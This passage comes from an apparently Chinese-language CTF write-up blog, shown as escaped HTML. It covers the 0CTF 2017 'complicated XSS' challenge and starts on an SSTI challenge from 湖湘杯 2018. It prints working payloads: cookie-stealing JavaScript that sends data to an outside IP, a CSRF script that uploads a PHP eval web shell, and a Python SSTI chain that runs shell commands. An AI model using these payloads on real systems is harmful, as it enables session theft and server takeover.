&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">location&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://webhook/?cookie=&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#75af00">escape&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookie&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以成功获取数据&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>Tue Mar &lt;span style="color:#ae81ff">21&lt;/span> 20:13:35 2017&lt;span style="color:#f92672">]&lt;/span> 202.120.7.205:47632 &lt;span style="color:#f92672">[&lt;/span>200&lt;span style="color:#f92672">]&lt;/span>: /xss/xss_new.php?cookie&lt;span style="color:#f92672">=&lt;/span>username%3Dadmin%3B%20username%3D%3Cscript%20src%3D//121.42.175.111%3A8080/xss/test.js%3E%3C/script%3Etestxss
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>admin的sessionid设置了HttpOnly，我们还得CSRF&lt;/p>
&lt;p>由于admin子域站删除了一些函数，我们可以用&lt;code>iframe&lt;/code>的骚操作来绕过&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">iframe&lt;/span> &lt;span style="color:#75af00">id&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;sandbox&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&amp;lt;/&lt;/span>&lt;span style="color:#f92672">iframe&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>window.XMLHttpRequest=document.getElementById(&amp;#39;sandbox&amp;#39;).contentWindow.XMLHttpRequest;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以构造ajax来读admin的页面源码&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>&lt;span style="color:#75af00">xss&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;iframe id=\&amp;#34;sandbox\&amp;#34;&amp;gt;&amp;lt;/iframe&amp;gt;&amp;lt;script src=//vps-ip/xss/test.js&amp;gt;&amp;lt;\/script&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookie&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;username=&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#75af00">xss&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;testxss;domain=.government.vip;path=\/;&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>&lt;span style="color:#75af00">location&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://admin.government.vip:8000/&amp;#39;&lt;/span>&lt;span style="color:#111">;&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>test.js&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">XMLHttpRequest&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">getElementById&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;sandbox&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">contentWindow&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">XMLHttpRequest&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">xhr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">XMLHttpRequest&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">xhr&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onreadystatechange&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">xhr&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">readyState&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">xhr&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">status&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#ae81ff">200&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">xhr&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">responseText&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">imgsrc&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">createElement&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;img&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">imgsrc&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">src&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://webhook/?cookie=&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">escape&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">xhr&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;get&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">xhr&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以获得管理员页面代码&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&amp;lt;!doctype html&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">head&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">title&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>Admin Panel&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">title&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//sandbox
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">delete&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#111">Function&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">delete&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">delete&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">alert&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">delete&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">XMLHttpRequest&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">delete&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#111">Proxy&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">delete&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Image&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">delete&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">postMessage&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">head&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">h1&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>Hello &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">iframe&lt;/span> &lt;span style="color:#75af00">id&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;sandbox&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&amp;lt;/&lt;/span>&lt;span style="color:#f92672">iframe&lt;/span>&lt;span style="color:#111">&amp;gt;&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span> &lt;span style="color:#75af00">src&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">//vps-ip/xss/test.js&lt;/span>&lt;span style="color:#111">&amp;gt;&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>testxss&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">h1&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">p&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>Upload your shell&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">p&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">form&lt;/span> &lt;span style="color:#75af00">action&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;/upload&amp;#34;&lt;/span> &lt;span style="color:#75af00">method&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;post&amp;#34;&lt;/span> &lt;span style="color:#75af00">enctype&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;multipart/form-data&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">p&lt;/span>&lt;span style="color:#111">&amp;gt;&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;file&amp;#34;&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;file&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&amp;lt;/&lt;/span>&lt;span style="color:#f92672">input&lt;/span>&lt;span style="color:#111">&amp;gt;&amp;lt;/&lt;/span>&lt;span style="color:#f92672">p&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">p&lt;/span>&lt;span style="color:#111">&amp;gt;&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;submit&amp;#34;&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;upload&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">form&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这个上传功能，就需要csrf，不过由于页面上的XHR被禁用，所以得额外调用出来&lt;/p>
&lt;p>test.js&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">XMLHttpRequest&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">getElementById&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;sandbox&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">contentWindow&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">XMLHttpRequest&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">xhr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">XMLHttpRequest&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">xhr&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onreadystatechange&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">xhr&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">readyState&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//if(xhr.status==200){
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">res_status&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;status: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">xhr&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">status&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;\n&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">xhr&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">responseText&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">imgsrc&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">createElement&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;img&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">imgsrc&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">src&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://121.42.175.111:8080/xss/xss_new.php?cookie=&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">escape&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">res_status&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">escape&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//}
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">formData&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">FormData&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">content&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php @eval($_POST[c][/c]);?&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">blob&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Blob&lt;/span>&lt;span style="color:#111">([&lt;/span>&lt;span style="color:#75af00">content&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;text/plain&amp;#34;&lt;/span>&lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">formData&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;file&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">blob&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;angelwhutestshell.php&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">xhr&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;/upload&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">xhr&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">formData&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>配合主站的xss payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>&lt;span style="color:#75af00">xss&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;iframe id=\&amp;#34;sandbox\&amp;#34;&amp;gt;&amp;lt;/iframe&amp;gt;&amp;lt;script src=//******/xss/test.js&amp;gt;&amp;lt;\/script&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookie&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;username=&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#75af00">xss&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;testxss;domain=.government.vip;path=\/;&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>&lt;span style="color:#75af00">location&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://admin.government.vip:8000/&amp;#39;&lt;/span>&lt;span style="color:#111">;&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>就可以获得flag了&lt;/p>
&lt;p>参考：&lt;a href="https://www.angelwhu.com/paper/2017/03/23/0ctf2017-web-topic-summary/#complicated-xss">wp&lt;/a> | &lt;a href="https://www.cdxy.me/?p=764">wp2&lt;/a> | &lt;a href="https://www.40huo.cn/blog/0ctf-2017-writeup.html">wp3&lt;/a> | &lt;a href="https://www.leavesongs.com/HTML/zhihu-xss-worm.html">知乎某处XSS+刷粉超详细漏洞技术分析&lt;/a>&lt;/p>
&lt;h2 id="湖湘杯-2018xmeo">[湖湘杯 2018]XmeO&lt;/h2>
&lt;h3 id="预期---ssti">预期 - SSTI&lt;/h3>
&lt;pre tabindex="0">&lt;code>{&amp;#39;&amp;#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&amp;#39;__builtins__&amp;#39;][&amp;#39;eval&amp;#39;](&amp;#39;__import__(&amp;#34;os&amp;#34;).popen(&amp;#34;ls -r /*/*&amp;#34;).read()&amp;#39;)}}
&lt;/code>&lt;/pre>&lt;p>发现web目录为&lt;code>/home/XmeO&lt;/code>，然后grep搜索flag字符&lt;/p>
